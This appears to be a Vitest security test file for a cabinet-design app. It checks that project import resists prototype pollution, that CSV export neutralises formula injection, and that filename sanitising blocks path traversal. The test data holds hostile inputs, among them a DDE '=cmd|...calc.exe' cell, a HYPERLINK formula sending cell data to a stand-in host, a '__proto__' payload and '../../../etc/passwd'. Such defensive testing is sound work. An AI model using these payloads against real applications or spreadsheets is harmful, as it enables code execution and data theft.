import { describe, expect, it } from 'vitest';
import { csvCell, hydrate, safeFileName, toCsv } from '../storage.js';
import { tinyProject } from './fixtures.js';

/* ---------------------------------------------------------------------------
   A project file is something people send each other, so it is attacker
   controlled input and it is tested like it.
   --------------------------------------------------------------------------- */

const hostileFile = (over = {}) => ({
  schema: 3, id: 'x', name: 'k', savedAt: 1, cut: [], prices: {}, quoted: '',
  project: { ...tinyProject(), ...over },
});

describe('a crafted project file cannot reach through the validator', () => {
  it('does not let a built in name through as a config key', () => {
    const h = hydrate(hostileFile({
      cfg: { toString: 'pwned', valueOf: 'pwned', hasOwnProperty: 1, carcassThk: 18 },
    }));

    const cfg = h.project.cfg;
    expect(Object.hasOwn(cfg, 'toString')).toBe(false);
    expect(typeof cfg.toString).toBe('function');
    // A real setting in the same file is still read.
    expect(cfg.carcassThk).toBe(18);
    // And the object can still be turned into text, which is what a
    // overwritten toString would have stopped.
    expect(String(cfg)).toBe('[object Object]');
  });

  it('does not let a built in name through as a cabinet setting', () => {
    const project = tinyProject();
    project.walls[0].units[0].settings = {
      toString: 'x', valueOf: 'x', width: 600,
      cfg: { toString: 'x', carcassThk: 18 },
    };
    const h = hydrate(hostileFile(project));
    const s = h.project.walls[0].units[0].settings;

    expect(Object.hasOwn(s, 'toString')).toBe(false);
    expect(s.width).toBe(600);
    expect(Object.hasOwn(s.cfg, 'toString')).toBe(false);
    expect(s.cfg.carcassThk).toBe(18);
  });

  it('does not let a built in name through as a price or a sheet name', () => {
    const h = hydrate({
      ...hostileFile(),
      prices: { toString: 5, hinge: 9, sheets: { toString: { size: [1, 1], cost: 1 } } },
    });
    expect(Object.hasOwn(h.prices, 'toString')).toBe(false);
    expect(h.prices.hinge).toBe(9);
    expect(Object.hasOwn(h.prices.sheets, 'toString')).toBe(false);
  });

  it('never writes anything onto the shared prototype', () => {
    hydrate({
      ...hostileFile({ cfg: { __proto__: { polluted: true }, carcassThk: 18 } }),
      prices: { __proto__: { pricePolluted: true } },
    });
    expect({}.polluted).toBeUndefined();
    expect({}.pricePolluted).toBeUndefined();
  });

  it('does not take a built in name as the id of a saved project', () => {
    for (const id of ['__proto__', 'constructor', 'toString']) {
      expect(hydrate({ ...hostileFile(), id }).id, id).not.toBe(id);
    }
    expect(hydrate({ ...hostileFile(), id: 'p123ok' }).id).toBe('p123ok');
  });
});

/* ---------------------------------------------------------------------------
   The cut list is opened in a spreadsheet, and a spreadsheet runs the cells.
   --------------------------------------------------------------------------- */

describe('an exported cut list is data, not a formula', () => {
  const dangerous = [
    "=cmd|'/c calc.exe'!A1",
    '=1+1',
    '+1+1',
    '-1+1',
    '@SUM(A1)',
    '=HYPERLINK("http://example.com?x="&A1,"click")',
    '\tstarts with a tab',
  ];

  for (const value of dangerous) {
    it(`neutralises ${JSON.stringify(value.slice(0, 24))}`, () => {
      const cell = csvCell(value);
      // Whatever quoting is applied, the first character a spreadsheet sees
      // inside the cell must not open a formula.
      const inner = cell.startsWith('"') ? cell.slice(1, -1) : cell;
      expect(/^[=+\-@\t\r]/.test(inner), cell).toBe(false);
      // The original text is still there, just prefixed.
      expect(inner.replace(/^'/, '').replace(/""/g, '"')).toBe(value);
    });
  }

  it('leaves ordinary cells exactly as they were', () => {
    for (const plain of ['A1-SIDE-L', 'Left side', 'White melamine 16mm', '720', '']) {
      expect(csvCell(plain)).toBe(plain);
    }
  });

  it('still quotes commas, quotes and newlines', () => {
    expect(csvCell('Base, 2 door')).toBe('"Base, 2 door"');
    expect(csvCell('say "hi"')).toBe('"say ""hi"""');
    expect(csvCell('two\nlines')).toBe('"two\nlines"');
  });

  it('a formula that also contains a comma is both quoted and neutralised', () => {
    expect(csvCell('=A1,B2')).toBe('"\'=A1,B2"');
  });

  it('builds a document with one row per line', () => {
    expect(toCsv([['a', 'b'], ['c', 'd']])).toBe('a,b\nc,d');
  });
});

describe('a download filename cannot be steered by the project name', () => {
  it('strips anything that is not a letter, a number, a space or a dash', () => {
    expect(safeFileName('../../../etc/passwd', '.json')).toBe('etcpasswd.json');
    // A newline is whitespace, so it collapses to a dash the way a space does.
    expect(safeFileName('kitchen\n.exe', '.json')).toBe('kitchen-exe.json');
    expect(safeFileName('My Kitchen', '.json')).toBe('my-kitchen.json');
  });

  it('falls back rather than producing a nameless file', () => {
    for (const empty of ['', '   ', '///', null, undefined]) {
      expect(safeFileName(empty, '.json')).toBe('kitchen.json');
    }
  });
});
